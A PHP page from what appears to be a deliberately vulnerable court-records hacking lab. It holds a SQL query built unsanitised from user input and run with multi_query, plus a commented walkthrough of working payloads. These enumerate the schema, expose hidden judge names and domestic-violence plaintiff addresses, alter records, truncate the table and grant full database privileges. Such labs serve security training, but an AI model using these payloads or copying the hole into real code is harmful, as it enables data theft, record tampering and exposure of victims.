<?php
/*
Note even though the user here was smart and only uses the first entry returned from the sql query. If the first case number doesn't exist then then
second statement will be the first case number.

Step 1: Find the custom schema and return as the case number by continually adding 'test' as test until the columns match up.
$_GET['casenumber'] = "fakecasenumber' UNION ALL SELECT GROUP_CONCAT(concat(schema_name)separator ';'),'test' as test,'test' as test,'test' as test,'test' as test,'test' as test,'test' as test,'test' as test,'test' as test FROM INFORMATION_SCHEMA.schemata WHERE '1'='1";

Step 2: Get all the table names from that custom schema.
$_GET['casenumber'] = "fakecasenumber' UNION ALL SELECT GROUP_CONCAT(concat(TABLE_NAME)separator ';'),'test' as test,'test' as test,'test' as test,'test' as test,'test' as test,'test' as test,'test' as test,'test' as test FROM INFORMATION_SCHEMA.TABLES WHERE table_schema ='websitedata";

Step 3: Get all the column names from that table
$_GET['casenumber'] = "fakecasenumber' UNION ALL SELECT GROUP_CONCAT(concat(COLUMN_NAME)separator ';'),'test' as test,'test' as test,'test' as test,'test' as test,'test' as test,'test' as test,'test' as test,'test' as test FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME ='casedata";

Step 4: Now that we have all the column names for case data we can return different items. We notice the number of columns is also the number needed for the select statement so we assume they are using an *
We also notice a column that is not displayed anywhere called "Judge". We can replace case description with Judge to print out who the Judge will be.
$_GET['casenumber'] = "fakecasenumber' UNION ALL SELECT Case_Number,Case_Type,Plaintiff_Name,Plaintiff_Address,Defendant_Name,Defendant_Address,Hearing_Date,Judge as Case_Description,Judge From casedata WHERE Case_Number = '12C934902";

Step 5: We notice on domestic violence cases the plaintiff addres isn't shown. Using the same trick as before we can show the plaintiff address as case description
$_GET['casenumber'] = "fakecasenumber' UNION ALL SELECT Case_Number,Case_Type,Plaintiff_Name,Plaintiff_Address,Defendant_Name,Defendant_Address,Hearing_Date,Plaintiff_Address as Case_Description,Judge From casedata WHERE Case_Number = '12C934902";

Step 6: We test to see if it will let us run multiple queries. If the permissions aren't set right we can update or delte out information.
//Resets the hearing date for a month earlier.
fakecasenumber'; UPDATE casedata SET Hearing_Date = '10/5/2019' WHERE Case_Number = '12C934903

Step 7: We can update the defendants name to something else
//Updates the defendants name in a criminal case
fakecasenumber'; UPDATE casedata SET Defendant_Name = 'John Smith' WHERE Case_Number = '12C934909

Step 8: We can wipe out all the data using truncate.
fakecasenumber'; TRUNCATE casedata; UPDATE casedata SET Defendant_Name = 'John Smith' WHERE Case_Number = '12C934909

Step 9: Finally we can create a new user so we can simply login ourselves to more directly control the mysql server.
$_GET['casenumber'] = "fakecasenumber'; GRANT ALL PRIVILEGES ON *.* TO 'hackerman'@'localhost' IDENTIFIED BY 'password";

//Reset the name for case 19C934903
UPDATE `casedata` SET Defendant_Name = 'Larry David' WHERE Case_Number = '12C934903'
*/
include "../sql.php";
//$_GET['casenumber'] = "fakecasenumber'; GRANT ALL PRIVILEGES ON *.* TO 'hackerman'@'localhost' IDENTIFIED BY 'password2";

//$_GET['casenumber'] = '12C934903';
if(!isset($_GET['casenumber'])){
    //Send to index.php
    header("Location: index.php");
    //echo "No case number";
   // header("Location: index.php");
}else{
    require('../resources/header.html');
    ?>
<div class='container'>
  <div class="row text-center">
    <div class="col-lg-8 mx-auto">
      <h1 class='text-primary'>Case Page</h1>
      <br>
    </div>
  </div>
</div>
<div class="container">
      <div class="row">
        <div class="col-lg-10 mx-auto">
<?php
    //casenumber=12C934902' UNION ALL SELECT Plaintiff_Address as Defendant_Name WHERE casenumber = '12C934902
    //Case_Number,Case_Type,Plaintiff_Name,Defendant_Name,Hearing_Date,Case_Description 

    $sqlquery = "SELECT * FROM casedata WHERE Case_Number = '". $_GET['casenumber'] . "' and Expunged = False";
    //echo $sqlquery;
    $sqlerrormessage = False;
    $returnedarray = [];
    try{
        if ($connection->multi_query($sqlquery)) {
            /* store first result set */
            if ($result = $connection->store_result()) {
                $results = $result->fetch_all(MYSQLI_ASSOC);
                //print_r($results[0]);
                if(count($results) == 0){
                  echo '<div class="alert alert-danger">Case Not Found</div>';

                }else{
                  $returnedarray = $results;
                  echo "<h3>Case Information</h3>";
                  echo "<span class='text-primary font-weight-bold'>Case Number:</span><span id='casenumber'> " . $results[0]['Case_Number'] ."</span>\n";
                  echo "<br><span class='text-primary font-weight-bold'>Case Type:</span><span id='case_type'> " . $results[0]['Case_Type'] . "</span>\n";
                  $expunged_human_readable = $results[0]['Expunged'] ? "True" : "False";
                  echo "<br><span class='text-primary font-weight-bold'>Expunged: </span><span id='expunged'>" . $expunged_human_readable . "</span>\n";

                  echo "<hr>";
                  echo "<h3>Party Information</h3>";
                  echo "<br><span class='text-primary font-weight-bold'>Plaintiff Name: </span><span id='plaintiff_name'>" . $results[0]['Plaintiff_Name']. "</span>\n";
                  if($results[0]['Case_Type'] != 'Domestic Violence'){
                      echo "<br><span class='text-primary font-weight-bold'>Plaintiff Address: </span><span id='plaintiff_address'>" . $results[0]['Plaintiff_Address']. "</span>\n";
                  }else{
                    echo "<br><span class='text-primary font-weight-bold'>Plaintiff Address: </span><span id='plaintiff_address'>PLAINTIFFS ADDRESS NOT SHOWN IN DV CASES</span>\n";
                  }
                  echo "<br><span class='text-primary font-weight-bold'>Defendant Name: </span><span id='defendant_name'>" . $results[0]['Defendant_Name']. "</span>\n";
                  echo "<br><span class='text-primary font-weight-bold'>Defendant Address: </span><span id='defendant_address'>" . $results[0]['Defendant_Address']. "</span>\n";
                  echo "<hr>";
                  echo "<h3>Case Information</h3>";

                  echo "<br><span class='text-primary font-weight-bold'>Hearing Date: </span><span id='hearing_date'>" . $results[0]['Hearing_Date']. "</span>\n";
                  echo "<br><span class='text-primary font-weight-bold'>Case Description: </span><span id='case_description'>" . $results[0]['Case_Description']. "</span>\n";
                  print "<!--Judge Name: " . $results[0]['Judge'] . " DO NOT MAKE PUBLIC-->";
                  $result->free();
                }
            }
        }else{
            $sqlerrormessage = $connection->error;
        }
    }catch(Exception $e){
        print($e);
    }
}
?>
</div>
</div>
<hr>
</br>
<span class='text-primary font-weight-bold'>Chief Judge Matthew's Wise Words: </span><span id='wise_quote'>New lawyers, listen up: A smartphone in your hand is worth two law books on your shelf. </span>

</div>
<div class='container'>
  <div class="row text-left">
    <div class="col-lg-12 mx-auto">
        <hr>
      
      <button class='btn btn-primary' data-toggle="collapse" data-target="#hackerhelp">Click For Hacker Help</button>
      <div id="hackerhelp" class="collapse">
        <p>The information below might help you in your hacking</p>
        <span class='text-primary font-weight-bold'>SQL Query Being Used By The Site</span>
        <p><?php echo $sqlquery?></p>
        <?php
        if($sqlerrormessage!== False){
            echo "<span class='text-primary font-weight-bold'>SQL Error:</span>";
            echo "<p>" . $sqlerrormessage . "</p>";
        }else{
          echo "<span class='text-primary font-weight-bold'>Returned Array:</span>";
          echo "<pre>";
          print_r($returnedarray);
          echo "</pre>";
        }
        ?>
      </div>
      </br>
      </br>
    </div>
  </div>
</div>
<?php
require "../resources/footer.html";

?>